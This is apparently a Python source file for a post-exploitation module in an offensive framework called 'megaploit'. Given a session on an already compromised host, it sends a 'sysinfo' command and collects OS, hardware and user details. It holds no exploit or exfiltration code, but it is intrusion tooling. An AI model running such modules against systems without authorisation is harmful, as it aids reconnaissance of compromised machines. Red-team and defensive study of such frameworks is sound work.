"""
megaploit.modules.post.multi.gather.sysinfo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Post-exploitation module: collect full system information from an active session.
"""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostSysinfo(AgentModule):
    name        = "post/multi/gather/sysinfo"
    description = "Collect detailed OS, hardware, and user information from the session"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = ["https://attack.mitre.org/techniques/T1082/"]
    platform    = ["windows", "linux", "macos"]
    arch        = ["x64", "x86", "arm64"]
    rank        = 500

    def _define_options(self) -> None:
        self._opt("SESSION", OptionType.INTEGER, required=True,
                  description="Session ID to target")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        self._emit("[*] Gathering sysinfo…")
        out = self._send("sysinfo", sess)
        if out.strip():
            self._ok("sysinfo collected", output=out)
        else:
            self._fail("sysinfo returned empty output")
        return self.results

MODULE = PostSysinfo
